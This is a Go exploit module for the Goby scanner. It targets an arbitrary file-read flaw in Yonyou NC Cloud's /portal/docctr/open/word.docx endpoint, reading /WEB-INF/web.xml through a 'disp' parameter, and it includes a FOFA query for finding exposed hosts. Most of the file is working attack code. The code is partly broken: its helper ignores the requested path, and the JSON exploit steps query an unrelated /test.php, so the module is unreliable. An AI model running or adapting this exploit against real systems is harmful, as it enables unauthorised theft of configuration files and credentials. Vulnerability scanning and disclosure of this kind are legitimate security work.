package exploits

import (
	"errors"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Yonyou NC /portal/docctr/open/word.docx File Read Vulnerability",
    "Description": "<p>Uf NC Cloud, a digital platform for large enterprises, focuses on digital management, digital operation and digital business to help large enterprises realize the comprehensive digitalization of people, finance, goods and customers, thereby driving business innovation and management reform, and redefining the height of the future together with enterprise managers. It provides customers with 14 industry categories and 68 sub-sectors for large enterprise groups, manufacturing, consumer goods, construction, real estate, finance and insurance, covering 18 major solutions such as digital marketing, intelligent manufacturing, financial sharing, and digital procurement to help enterprises fully land digital. There is an arbitrary file reading vulnerability in the NC Cloud word.docx interface</p>",
    "Product": "yonyou-NC-Cloud",
    "Homepage": "https://uclient.yonyou.com/",
    "DisclosureDate": "2024-10-21",
    "PostTime": "2024-10-21",
    "Author": "3013320359@qq.com",
    "FofaQuery": "body=\"UClient.dmg\" && title=\"Yonyou\"",
    "GobyQuery": "body=\"UClient.dmg\" && title=\"Yonyou\"",
    "Level": "1",
    "Impact": "<p>Uf NC Cloud, a digital platform for large enterprises, focuses on digital management, digital operation and digital business to help large enterprises realize the comprehensive digitalization of people, finance, goods and customers, thereby driving business innovation and management reform, and redefining the height of the future together with enterprise managers. It provides customers with 14 industry categories and 68 sub-sectors for large enterprise groups, manufacturing, consumer goods, construction, real estate, finance and insurance, covering 18 major solutions such as digital marketing, intelligent manufacturing, financial sharing, and digital procurement to help enterprises fully land digital. There is an arbitrary file reading vulnerability in the NC Cloud word.docx interface</p>",
    "Recommendation": "<p>Follow the official patch release information to install the patch or upgrade to the latest version: <a href=\"https://uclient.yonyou.com/\">https://uclient.yonyou.com/</a></p>",
    "References": [
        "https://blog.csdn.net/qq_56698744/article/details/134787642"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "web.xml,Customize",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "web.xml",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.0",
    "Translation": {
        "CN": {
            "Name": "用友NC /portal/docctr/open/word.docx 文件读取漏洞",
            "Product": "用友-NC-Cloud",
            "Description": "<p>用友 NC Cloud，大型企业数字化平台， 聚焦数字化管理、数字化经营、数字化商业，帮助大型企业实现 人、财、物、客的全面数字化，从而驱动业务创新与管理变革，与企业管理者一起重新定义未来的高度。为客户提供面向大型企业集团、制造业、消费品、建筑、房地产、金融保险等14个行业大类，68个细分行业，涵盖数字营销、智能制造、财务共享、数字采购等18大解决方案，帮助企业全面落地数字化。用友NC Cloud word.docx接口存在任意文件读取漏洞<br></p>",
            "Recommendation": "<p>1、关注官方补丁发布信息，打上补丁或者升级到最新版本：<a href=\"https://uclient.yonyou.com/\">https://uclient.yonyou.com/</a><br></p><p>2、部署Web应⽤防⽕墙，对数据库操作进⾏监控。&nbsp;&nbsp;&nbsp;</p><p>3、如⾮必要，禁⽌公⽹访问该系统。<br></p>",
            "Impact": "<p>攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致敏感信息泄露、数据盗窃及其他安全风险，从而对系统和用户造成严重危害。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Yonyou NC /portal/docctr/open/word.docx File Read Vulnerability",
            "Product": "yonyou-NC-Cloud",
            "Description": "<p>Uf NC Cloud, a digital platform for large enterprises, focuses on digital management, digital operation and digital business to help large enterprises realize the comprehensive digitalization of people, finance, goods and customers, thereby driving business innovation and management reform, and redefining the height of the future together with enterprise managers. It provides customers with 14 industry categories and 68 sub-sectors for large enterprise groups, manufacturing, consumer goods, construction, real estate, finance and insurance, covering 18 major solutions such as digital marketing, intelligent manufacturing, financial sharing, and digital procurement to help enterprises fully land digital. There is an arbitrary file reading vulnerability in the NC Cloud word.docx interface<br></p>",
            "Recommendation": "<p>Follow the official patch release information to install the patch or upgrade to the latest version:&nbsp;<a href=\"https://uclient.yonyou.com/\">https://uclient.yonyou.com/</a><br></p>",
            "Impact": "<p>Uf NC Cloud, a digital platform for large enterprises, focuses on digital management, digital operation and digital business to help large enterprises realize the comprehensive digitalization of people, finance, goods and customers, thereby driving business innovation and management reform, and redefining the height of the future together with enterprise managers. It provides customers with 14 industry categories and 68 sub-sectors for large enterprise groups, manufacturing, consumer goods, construction, real estate, finance and insurance, covering 18 major solutions such as digital marketing, intelligent manufacturing, financial sharing, and digital procurement to help enterprises fully land digital. There is an arbitrary file reading vulnerability in the NC Cloud word.docx interface<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9962"
}`
	postOrGet_zL8fZ1dA := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		respTxt := ""
		// 注意：返回值为（最终要返回的读取结果，错误）
		requestConfig := httpclient.NewGetRequestConfig("/portal/docctr/open/word.docx?disp=/WEB-INF/web.xml")
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig)
		if err != nil || resp.StatusCode != 200 {
			err = errors.New("failed to read file")
			return "", err
		}
		respTxt = resp.RawBody
		return respTxt, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/portal/docctr/open/word.docx?disp="
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"/WEB-INF/web.xml": "?xml version",
			}
			// 函数继承
			uploadFileFunc := postOrGet_zL8fZ1dA

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"web.xml": {"/WEB-INF/web.xml", "?xml version"},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_zL8fZ1dA

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}

			expResult.Success = true
			expResult.Output = resp
			return expResult
		}))
}
